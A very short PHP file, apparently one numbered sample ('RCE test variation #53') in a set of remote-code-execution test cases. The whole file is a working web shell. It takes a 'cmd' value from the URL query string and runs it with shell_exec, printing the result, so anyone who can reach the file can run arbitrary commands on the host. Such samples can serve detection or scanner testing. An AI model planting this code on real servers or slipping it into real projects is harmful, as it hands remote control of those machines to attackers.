<?php
// RCE test variation #53
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>